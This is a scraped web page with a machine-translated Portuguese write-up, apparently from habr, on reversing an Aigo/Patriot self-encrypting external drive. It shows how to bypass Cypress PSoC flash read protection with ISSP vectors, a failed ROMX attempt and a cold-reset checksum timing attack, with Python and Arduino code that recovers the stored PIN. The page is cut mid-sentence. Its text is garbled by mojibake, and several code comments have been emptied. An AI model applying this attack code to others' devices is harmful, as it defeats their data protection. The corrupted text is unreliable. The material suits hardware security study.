<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§ΩüèΩ üì¨ ‚òÑÔ∏è Como reverter e invadir o disco r√≠gido externo auto-criptografado do Aigo. Parte 2: Despejando com Cypress PSoC üë®üèª‚ÄçüöÄ ü§µüèø üñïüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Esta √© a segunda e √∫ltima parte do artigo sobre como invadir unidades externas de criptografia autom√°tica. Recordo que um colega recentemente me troux...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Como reverter e invadir o disco r√≠gido externo auto-criptografado do Aigo. Parte 2: Despejando com Cypress PSoC</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/455529/"><p>  Esta √© a segunda e √∫ltima parte do artigo sobre como invadir unidades externas de criptografia autom√°tica.  Recordo que um colega recentemente me trouxe um disco r√≠gido Patriot (Aigo) SK8671, e decidi revert√™-lo, e agora estou compartilhando o que veio dele.  Antes de continuar a leitura, leia a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">primeira parte do</a> artigo. </p><br><p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">4. Come√ßamos a remover o despejo da unidade flash interna PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">5. protocolo ISSP</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">5.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O que √© um ISSP?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">5.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Desmistifica√ß√£o de vetores</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">5.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Conversar com PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 5.4</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Identifica√ß√£o de registros intra-chip</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 5.5</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Bits de prote√ß√£o</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">6. Primeiro ataque (com falha): ROMX</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">7. Segundo ataque: rastreamento com reset a frio</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 7.1</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Implementa√ß√£o</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">7.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Leia o resultado</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">7.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Reconstru√ß√£o do bin√°rio flash</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 7.4</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Encontre o endere√ßo de armazenamento do c√≥digo PIN</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 7,5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">N√≥s removemos o despejo do bloco n ¬∞ 126</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">- 7.6</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Recupera√ß√£o Pincode</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">8. O que vem depois?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">9. Conclus√£o</a> </p><br><p><img src="https://habrastorage.org/webt/wx/nm/gk/wxnmgkeurrmiurx87rujoynxrsq.jpeg"></p><a name="habracut"></a><br><a name="a4"></a><br><h1 id="4-nachinaem-snimat-damp-s-vnutrenney-fleshki-psoc">  4. Come√ßamos a remover o despejo da unidade flash interna PSoC </h1><br><p>  Portanto, tudo indica (como estabelecemos em [a primeira parte] ()) que o c√≥digo PIN √© armazenado nas entranhas do flash PSoC.  Portanto, precisamos ler esses intestinos instant√¢neos.  Frente do trabalho necess√°rio: </p><br><ul><li>  assumir o controle da "comunica√ß√£o" com o microcontrolador; </li><li>  encontre uma maneira de verificar se essa "comunica√ß√£o" est√° protegida da leitura externa; </li><li>  encontre uma maneira de contornar a seguran√ßa. </li></ul><br><p>  H√° dois lugares em que faz sentido procurar um c√≥digo PIN v√°lido: </p><br><ul><li>  mem√≥ria flash interna; </li><li>  SRAM, onde o c√≥digo PIN pode ser armazenado para compar√°-lo com o c√≥digo PIN inserido pelo usu√°rio. </li></ul><br><p>  Olhando para o futuro, observo que ainda consegui remover o despejo da unidade flash interna do PSoC, ignorando seu sistema de prote√ß√£o, com a ajuda do ataque de hardware "trace with cold reset", depois de reverter os recursos n√£o documentados do protocolo ISSP.  Isso me permitiu despejar diretamente o c√≥digo PIN atual. </p><br><pre><code class="plaintext hljs">$ ./psoc.py syncing: KO OK [...] PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  O c√≥digo do programa resultante: </p><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">C√≥digo Arduino para HSSP</a> ; </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Driver Python e desmontador do ISSP</a> . </li></ul><br><a name="a5"></a><br><h1 id="5-issp-protokol">  5. protocolo ISSP </h1><br><a name="a51"></a><br><h2 id="51-chto-takoe-issp">  5.1  O que √© um ISSP? </h2><br><p>  ‚ÄúComunica√ß√£o‚Äù com o microcontrolador pode significar coisas diferentes: de ‚Äúfornecedor para fornecedor‚Äù, para intera√ß√£o usando um protocolo serial (por exemplo, ICSP para PIC da Microchip). </p><br><p>  O Cypress possui seu pr√≥prio protocolo propriet√°rio, chamado ISSP (protocolo de programa√ß√£o serial no sistema), que √© parcialmente descrito na <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">especifica√ß√£o t√©cnica</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">US7185162</a> tamb√©m fornece algumas informa√ß√µes.  H√° tamb√©m um anal√≥gico de c√≥digo aberto chamado HSSP (vamos us√°-lo um pouco mais tarde).  O ISSP funciona da seguinte maneira: </p><br><ul><li>  reinicie o PSoC; </li><li>  traga o n√∫mero m√°gico para a se√ß√£o de dados seriais deste PSoC;  para entrar no modo de programa√ß√£o externa; </li><li>  envie comandos que s√£o longas cadeias de bits chamadas "vetores". </li></ul><br><p>  Na documenta√ß√£o do ISSP, esses vetores s√£o definidos apenas para um pequeno punhado de comandos: </p><br><ul><li>  Inicializar-1 </li><li>  Initialize-2 </li><li>  Initialize-3 (op√ß√µes de 3V e 5V) </li><li>  ID-SETUP </li><li>  LEIA-ID-PALAVRA </li><li>  SET-BLOCK-NUM: 10011111010dddddddd111, em que dddddddd = bloco # </li><li>  ERASE A GRANEL </li><li>  BLOCO DE PROGRAMA </li><li>  VERIFICAR CONFIGURA√á√ÉO </li><li>  READ-BYTE: 10110aaaaaaZDDDDDDDDDZ1, em que DDDDDDDDDD = sa√≠da de dados, aaaaaa = endere√ßo (6 bits) </li><li>  WRITE-BYTE: 10010aaaaaadddddddd111, em que dddddddd = entrada de dados, aaaaaa = endere√ßo (6 bits) </li><li>  Seguro </li><li>  CONFIGURA√á√ÉO DE CHECKSUM </li><li>  READ-CHECKSUM: 10111111001ZDDDDDDDDDZ110111111000ZDDDDDDDDZ1, em que DDDDDDDDDDDDDDDDD = sa√≠da de dados: soma de verifica√ß√£o do dispositivo </li><li>  APAGAR BLOCO </li></ul><br><p>  Por exemplo, o vetor para Initialize-2: </p><br><pre> <code class="plaintext hljs">1101111011100000000111 1101111011000000000111 1001111100000111010111 1001111100100000011111 1101111010100000000111 1101111010000000011111 1001111101110000000111 1101111100100110000111 1101111101001000000111 1001111101000000001111 1101111000000000110111 1101111100000000000111 1101111111100010010111</code> </pre> <br><p>  Todos os vetores t√™m o mesmo comprimento: 22 bits.  A documenta√ß√£o do HSSP possui algumas informa√ß√µes adicionais sobre os ISSPs: "Um vetor ISSP nada mais √© do que uma sequ√™ncia de bits que representa um conjunto de instru√ß√µes". </p><br><a name="a52"></a><br><h2 id="52-demistifikaciya-vektorov">  5.2  Desmistifica√ß√£o de vetores </h2><br><p>  Vamos ver o que acontece aqui.  Inicialmente, assumi que esses mesmos vetores s√£o variantes brutas das instru√ß√µes M8C; no entanto, tendo testado essa hip√≥tese, descobri que os c√≥digos de opera√ß√£o das opera√ß√µes n√£o correspondem. </p><br><p>  Depois, pesquisei no vetor acima e me deparei com <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">este</a> estudo, onde o autor, embora n√£o entre em detalhes, fornece algumas dicas pr√°ticas: ‚ÄúCada instru√ß√£o come√ßa com tr√™s bits que correspondem a uma das quatro mnem√¥nicas (leia da RAM, escreva para RAM , leia o registro, escreva o registro).  Depois vem o endere√ßo de 8 bits, seguido por 8 bits de dados (lidos ou gravados) e, finalmente, tr√™s bits de parada. ‚Äù </p><br><p>  Pude reunir algumas informa√ß√µes muito √∫teis na se√ß√£o ROM de supervis√£o (SROM) do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">manual t√©cnico</a> .  SROM √© uma ROM codificada no PSoC que fornece fun√ß√µes de servi√ßo (semelhantes ao Syscall) para c√≥digo de software em execu√ß√£o no espa√ßo do usu√°rio: </p><br><ul><li>  00h: SWBootReset </li><li>  01h: ReadBlock </li><li>  02h: WriteBlock </li><li>  03h: EraseBlock </li><li>  06h: Leitura da tabela </li><li>  07h: CheckSum </li><li>  08h: Calibrar0 </li><li>  09h: Calibrar1 </li></ul><br><p>  Comparando nomes de vetores com fun√ß√µes SROM, podemos mapear as v√°rias opera√ß√µes suportadas por este protocolo para os par√¢metros SROM esperados.  Gra√ßas a isso, podemos decodificar os tr√™s primeiros bits dos vetores ISSP: </p><br><ul><li>  100 =&gt; "wrmem" </li><li>  101 =&gt; "rdmem" </li><li>  110 =&gt; "wrreg" </li><li>  111 =&gt; "rdreg" </li></ul><br><p>  No entanto, um entendimento completo dos processos intra-chip s√≥ pode ser obtido atrav√©s da comunica√ß√£o direta com o PSoC. </p><br><a name="a53"></a><br><h2 id="53-obschenie-s-psoc">  5.3  Conversar com PSoC </h2><br><p>  Como Dirk Petrautsky j√° <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">portou o</a> c√≥digo Cypress HSSP para o Arduino, usei o Arduino Uno para conectar a placa do teclado ao conector ISSP. </p><br><p>  Observe que, durante minha pesquisa, mudei praticamente o c√≥digo Dirk.  Voc√™ pode encontrar minha modifica√ß√£o no GitHub: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui est√° o</a> script Python correspondente para se comunicar com o Arduino, no meu reposit√≥rio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">cypress_psoc_tools</a> . </p><br><p>  Ent√£o, usando o Arduino, no come√ßo eu usei apenas vetores ‚Äúoficiais‚Äù para ‚Äúcomunica√ß√£o‚Äù.  Tentei ler a ROM interna usando o comando VERIFY.  Como esperado, eu n√£o poderia fazer isso.  Provavelmente devido ao fato de que os bits de prote√ß√£o de leitura s√£o ativados dentro da unidade flash. </p><br><p>  Ent√£o eu criei alguns dos meus vetores simples para escrever e ler a mem√≥ria / registros.  Observe que podemos ler o SROM inteiro, mesmo que a unidade flash esteja protegida! </p><br><a name="a54"></a><br><h2 id="54-identifikaciya-vnutrichipovyh-registrov">  5.4  Identifica√ß√£o de registros intra-chip </h2><br><p>  Observando os vetores "desmontados", descobri que o dispositivo usa registros n√£o documentados (0xF8-0xFA) para indicar opcodes M8C que s√£o executados diretamente, ignorando a prote√ß√£o.  Isso me permitiu executar v√°rios c√≥digos de opera√ß√£o, como "ADD", "MOV A, X", "PUSH" ou "JMP".  Gra√ßas a eles (observando os efeitos colaterais que eles causam nos registros), pude determinar qual dos registros n√£o documentados s√£o na verdade registros regulares (A, X, SP e PC). </p><br><p>  Como resultado, o c√≥digo "desmontado" gerado pela ferramenta HSSP_disas.rb se parece com isso (para maior clareza, adicionei coment√°rios): </p><br><pre> <code class="plaintext hljs">--== init2 ==-- [DE E0 1C] wrreg CPU_F (f7), 0x00 #   [DE C0 1C] wrreg SP (f6), 0x00 #  SP [9F 07 5C] wrmem KEY1, 0x3A #    SSC [9F 20 7C] wrmem KEY2, 0x03 #  [DE A0 1C] wrreg PCh (f5), 0x00 #  PC (MSB) ... [DE 80 7C] wrreg PCl (f4), 0x03 # (LSB) ...  3 ?? [9F 70 1C] wrmem POINTER, 0x80 # RAM-    [DF 26 1C] wrreg opc1 (f9), 0x30 #  1 =&gt; "HALT" [DF 48 1C] wrreg opc2 (fa), 0x40 #  2 =&gt; "NOP" [9F 40 3C] wrmem BLOCKID, 0x01 # BLOCK ID   SSC [DE 00 DC] wrreg A (f0), 0x06 #  "Syscall" : TableRead [DF 00 1C] wrreg opc0 (f8), 0x00 #   SSC, "Supervisory SROM Call" [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12 #  :   </code> </pre> <br><a name="a55"></a><br><h2 id="55-zaschitnye-bity">  5.5  Bits de prote√ß√£o </h2><br><p>  Nesta fase, j√° posso me comunicar com o PSoC, mas ainda n√£o tenho informa√ß√µes confi√°veis ‚Äã‚Äãsobre os bits de prote√ß√£o da unidade flash.  Fiquei muito surpreso com o fato de o Cypress n√£o fornecer ao usu√°rio do dispositivo meios para verificar se a prote√ß√£o est√° ativada.  Entrei profundamente no Google para finalmente entender que o c√≥digo HSSP fornecido pelo Cypress foi atualizado depois que Dirk lan√ßou sua modifica√ß√£o.  E l√° vai voc√™!  Aqui est√° um novo vetor como este: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [9F A0 1C] wrmem 0xFD, 0x00 #   [9F E0 1C] wrmem 0xFF, 0x00 #  [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 02 1C] wrreg A (f0), 0x10 #  syscall ! [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Usando esse vetor (consulte read_security_data em psoc.py), obtemos todos os bits de prote√ß√£o na SRAM em 0x80, onde cada bit √© protegido com dois bits. </p><br><p>  O resultado √© deprimente: tudo √© protegido no modo "desativar leitura e grava√ß√£o externas".  Portanto, n√£o podemos apenas ler qualquer coisa da unidade flash USB, mas tamb√©m escrev√™-la (por exemplo, para introduzir um dumper de ROM).  E a √∫nica maneira de desativar a prote√ß√£o √© apagar completamente o chip inteiro.  :-( </p><br><a name="a6"></a><br><h1 id="6-pervaya-neudavshayasya-ataka-romx">  6. Primeiro ataque (com falha): ROMX </h1><br><p>  No entanto, podemos tentar o seguinte truque: como temos a capacidade de executar c√≥digos opcionais arbitr√°rios, por que n√£o executar o ROMX, que √© usado para ler a mem√≥ria flash?  Essa abordagem tem uma boa chance de sucesso.  Como a fun√ß√£o ReadBlock, que l√™ dados do SROM (usado por vetores), verifica se √© chamada pelo ISSP.  No entanto, o c√≥digo de opera√ß√£o ROMX, presumivelmente, pode n√£o ter essa verifica√ß√£o.  Ent√£o, aqui est√° o c√≥digo Python (depois de adicionar algumas classes auxiliares ao c√≥digo Arduino C): </p><br><pre> <code class="plaintext hljs">for i in range(0, 8192): write_reg(0xF0, i&gt;&gt;8) # A = 0 write_reg(0xF3, i&amp;0xFF) # X = 0 exec_opcodes("\x28\x30\x40") # ROMX, HALT, NOP byte = read_reg(0xF0) # ROMX reads ROM[A|X] into A print "%02x" % ord(byte[0]) # print ROM byte</code> </pre> <br><p>  Infelizmente, esse c√≥digo n√£o funciona.  :-( Em vez disso, funciona, mas na sa√≠da obtemos nossos pr√≥prios opcodes (0x28 0x30 0x40)! N√£o acho que a funcionalidade correspondente do dispositivo seja um elemento de prote√ß√£o de leitura. Isso √© mais um truque de engenharia: ao executar opcodes externos, o barramento de ROM √© redirecionado para um buffer tempor√°rio. </p><br><a name="a7"></a><br><h1 id="7-vtoraya-ataka-trassirovka-s-holodnoy-perezagruzkoy">  7. Segundo ataque: rastreamento com reset a frio </h1><br><p>  Como o truque do ROMX n√£o funcionou, comecei a pensar em outra varia√ß√£o desse truque - descrita na publica√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">"Lan√ßar muita luz na prote√ß√£o de firmware de um microcontrolador"</a> . </p><br><a name="a71"></a><br><h2 id="71-realizaciya">  7.1  Implementa√ß√£o </h2><br><p>  O seguinte vetor para CHECKSUM-SETUP est√° listado na documenta√ß√£o do ISSP: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [9F 40 1C] wrmem BLOCKID, 0x00 [DE 00 FC] wrreg A (f0), 0x07 [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Aqui, em ess√™ncia, a fun√ß√£o SROM 0x07 √© chamada, conforme apresentado na documenta√ß√£o (it√°lico meu): </p><br><blockquote>  Esta fun√ß√£o soma de verifica√ß√£o soma de verifica√ß√£o.  Ele calcula uma soma de verifica√ß√£o de 16 bits do n√∫mero de blocos definido pelo usu√°rio em um banco flash, contando a partir de zero.  O par√¢metro BLOCKID √© usado para transferir o n√∫mero de blocos que ser√£o usados ‚Äã‚Äãao calcular a soma de verifica√ß√£o.  Um valor de "1" calcular√° a soma de verifica√ß√£o apenas para o bloco zero;  enquanto <em>"0" levar√° ao fato de que a soma total de verifica√ß√£o de todos os 256 blocos do banco flash ser√° calculada.</em>  <em>Uma soma de verifica√ß√£o de 16 bits √© retornada via KEY1 e KEY2.</em>  No par√¢metro KEY1, os 8 bits baixos da soma de verifica√ß√£o s√£o fixos e, na KEY2, os 8 bits altos s√£o registrados.  Para dispositivos com v√°rios bancos de flash, a fun√ß√£o de soma de verifica√ß√£o √© chamada para cada um individualmente.  O n√∫mero do banco com o qual ele trabalhar√° √© definido pelo registro FLS_PR1 (configurando um bit correspondente ao banco flash de destino). </blockquote><p>  Observe que esta √© a soma de verifica√ß√£o mais simples: os bytes s√£o simplesmente somados um por um;  sem peculiaridades sofisticadas da CRC.  Al√©m disso, sabendo que o conjunto de registros no n√∫cleo M8C √© muito pequeno, presumi que, ao calcular a soma de verifica√ß√£o, os valores intermedi√°rios ser√£o fixados nas mesmas vari√°veis ‚Äã‚Äãque eventualmente ser√£o geradas: KEY1 (0xF8) / KEY2 (0xF9). </p><br><p>  Ent√£o, em teoria, meu ataque √© assim: </p><br><ol><li>  Conecte-se atrav√©s do ISSP. </li><li>  Iniciamos o c√°lculo da soma de verifica√ß√£o usando o vetor CHECKSUM-SETUP. </li><li>  Reiniciamos o processador ap√≥s o tempo especificado T. </li><li>  Leia RAM para obter a soma de verifica√ß√£o atual C. </li><li>  Repita as etapas 3 e 4, aumentando cada vez mais T. </li><li>  Recuperamos os dados da unidade flash subtraindo a soma de verifica√ß√£o C anterior da atual. </li></ol><br><p>  No entanto, surgiu um problema: o vetor Initialize-1, que devemos enviar ap√≥s a reinicializa√ß√£o, substitui KEY1 e KEY2: </p><br><pre> <code class="plaintext hljs">1100101000000000000000 # ,  PSoC    nop nop nop nop nop [DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A #     [9F 20 7C] wrmem KEY2, 0x03 #   [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 01 3C] wrreg A (f0), 0x09 # SROM- 9 [DF 00 1C] wrreg opc0 (f8), 0x00 # SSC [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Esse c√≥digo substitui nossa preciosa soma de verifica√ß√£o, chamando Calibrate1 (fun√ß√£o SROM 9) ... Talvez possamos simplesmente entrar no modo de programa√ß√£o enviando o n√∫mero m√°gico (do in√≠cio do c√≥digo acima) e depois ler SRAM?  E sim, funciona!  O c√≥digo do Arduino que implementa esse ataque √© bastante simples: </p><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">case</span></span> Cmnd_STK_START_CSUM: checksum_delay = ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">24</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">16</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">8</span></span>; checksum_delay |= getch(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay &gt; <span class="hljs-number"><span class="hljs-number">10000</span></span>) { ms_delay = checksum_delay/<span class="hljs-number"><span class="hljs-number">1000</span></span>; checksum_delay = checksum_delay%<span class="hljs-number"><span class="hljs-number">1000</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ms_delay = <span class="hljs-number"><span class="hljs-number">0</span></span>; } send_checksum_v(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay) delayMicroseconds(checksum_delay); delay(ms_delay); start_pmode();</code> </pre> <br><ol><li>  Leia checkum_delay. </li><li>  Execute o c√°lculo da soma de verifica√ß√£o (send_checksum_v). </li><li>  Aguarde um determinado per√≠odo de tempo;  dadas as seguintes armadilhas: <br><ul><li>  Passei muito tempo at√© descobrir que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">delayMicrosegundos acabou</a> funcionando corretamente apenas com atrasos n√£o superiores a 16383mks; </li><li>  e, em seguida, novamente matou a mesma quantidade de tempo at√© descobrir que delayMicroseconds, se passou 0 para sua entrada, funcionou completamente errado! </li></ul></li><li>  Recarregue o PSoC no modo de programa√ß√£o (basta enviar o n√∫mero m√°gico, sem enviar vetores de inicializa√ß√£o). </li></ol><br><p>  O c√≥digo Python resultante: </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> delay <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">150000</span></span>): <span class="hljs-comment"><span class="hljs-comment">#    for i in range(0, 10): #      try: reset_psoc(quiet=True) #       send_vectors() #    ser.write("\x85"+struct.pack("&gt;I", delay)) #    +    res = ser.read(1) #  arduino ACK except Exception as e: print e ser.close() os.system("timeout -s KILL 1s picocom -b 115200 /dev/ttyACM0 2&gt;&amp;1 &gt; /dev/null") ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5) #    continue print "%05d %02X %02X %02X" % (delay, #  RAM- read_regb(0xf1), read_ramb(0xf8), read_ramb(0xf9))</span></span></code> </pre> <br><p>  Em poucas palavras, o que esse c√≥digo faz: </p><br><ol><li>  Recarrega o PSoC (e envia um n√∫mero m√°gico). </li><li>  Envia vetores de inicializa√ß√£o completos. </li><li>  Chama a fun√ß√£o Arduino Cmnd_STK_START_CSUM (0x85), onde o atraso em microssegundos √© passado como um par√¢metro. </li><li>  L√™ a soma de verifica√ß√£o (0xF8 e 0xF9) e o registro n√£o documentado 0xF1. </li></ol><br><p>  Este c√≥digo √© executado 10 vezes em 1 microssegundo.  0xF1 est√° inclu√≠do aqui porque foi o √∫nico registro que foi alterado ao calcular a soma de verifica√ß√£o.  Talvez 